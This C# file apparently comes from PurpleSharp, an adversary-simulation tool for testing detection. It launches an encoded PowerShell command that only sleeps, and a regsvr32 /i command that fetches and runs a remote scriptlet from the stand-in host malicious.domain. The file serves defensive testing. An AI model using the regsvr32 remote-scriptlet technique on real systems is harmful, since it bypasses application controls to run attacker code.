using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Execution
    {
        static public void ExecutePowershell(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1086");
            try
            {
                string encodedPwd = "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==";
                ExecutionHelper.StartProcess("", String.Format("powershell.exe -enc {0}", encodedPwd), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

        static public void ExecuteRegsvr32(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1117");
            try
            {
                string url = @"http://malicious.domain:8080/payload.sct";
                string dll = "scrobj.dll";
                ExecutionHelper.StartProcess("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

    }
}
